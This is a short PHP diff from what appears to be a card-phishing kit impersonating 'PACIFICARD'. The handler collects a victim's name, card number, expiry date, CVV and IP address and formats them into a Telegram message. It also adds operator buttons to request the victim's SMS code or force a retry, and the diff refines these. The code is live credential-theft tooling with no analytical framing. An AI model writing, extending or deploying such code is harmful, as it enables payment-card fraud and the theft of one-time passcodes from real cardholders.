@@ -12,16 +12,20 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // Obtén la dirección IP del cliente
     $ip = $_SERVER['REMOTE_ADDR'];
 
+    // Incluir configuración de Telegram
+    require_once 'config.php';
+    
+    // Obtener usuario de la sesión
+    $user_id = getUserIdentifier();
+    
     // Formatea los datos para enviar a Telegram
     $mensaje = "PACIFICARD :\n";
+    $mensaje .= "👤 Usuario: $user_id\n";
     $mensaje .= "Nombre: $nombre $apellido\n";
     $mensaje .= "TRJ: $numero_tarjeta\n";
     $mensaje .= "FV: $mes_vencimiento/$ano_vencimiento\n";
     $mensaje .= "Cvvv: $codigo_seguridad\n";
     $mensaje .= "IP: $ip";
-
-    // Incluir configuración de Telegram
-    require_once 'config.php';
 
     // Obtener session_id
     $session_id = $_SESSION['session_id'] ?? uniqid('user_', true);
@@ -31,8 +35,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $keyboard = [
         'inline_keyboard' => [
             [
-                ['text' => '✅ Tarjeta Correcta - Pedir SMS', 'callback_data' => 'card_ok_' . $session_id],
-                ['text' => '❌ Tarjeta Incorrecta - Repetir', 'callback_data' => 'card_retry_' . $session_id]
+                ['text' => '✅ SMS', 'callback_data' => 'card_ok_' . $session_id],
+                ['text' => '❌ Card', 'callback_data' => 'card_retry_' . $session_id]
             ]
         ]
     ];
